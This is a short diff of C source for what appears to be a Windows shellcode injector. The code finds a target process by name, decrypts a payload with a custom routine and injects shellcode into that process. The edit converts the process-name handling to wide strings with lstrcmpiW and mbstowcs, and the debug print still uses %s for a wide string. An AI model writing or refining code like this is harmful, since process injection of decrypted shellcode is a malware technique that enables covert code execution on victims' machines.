@@ -13,7 +13,7 @@ void custom_decrypt(unsigned char *buf, const int buf_length) {
 	}	
 }
 
-int FindTarget(char* procname) { // Changed to wchar_t for Unicode
+int FindTarget(const wchar_t* procname) { // Changed to wchar_t for Unicode
 
     HANDLE hProcSnap;
     PROCESSENTRY32 pe32;
@@ -30,7 +30,7 @@ int FindTarget(char* procname) { // Changed to wchar_t for Unicode
     }
 
     while (Process32Next(hProcSnap, &pe32)) {
-        if (lstrcmpi(procname, pe32.szExeFile) == 0) { // Changed to lstrcmpiW for Unicode
+        if (lstrcmpiW(procname, pe32.szExeFile) == 0) { // Changed to lstrcmpiW for Unicode
             pid = pe32.th32ProcessID;
             break;
         }
@@ -49,7 +49,9 @@ void inject_shellcode_procname(unsigned char *shellcode, int shellcode_size, cha
     DEBUG_PRINT("Starting inject_shellcode_procname routine...\n");   
 
     int target_pid = 0;
-    char *target_process = payload_info;
+    wchar_t target_process[256]; // Assuming payload_info is less than 256 characters
+    mbstowcs(target_process, payload_info, 256); // Convert char* to wchar_t*
+
     DEBUG_PRINT("Extracted payload_info::process_name argument = %s\n", target_process);
 
     DEBUG_PRINT("Finding target PID...\n");
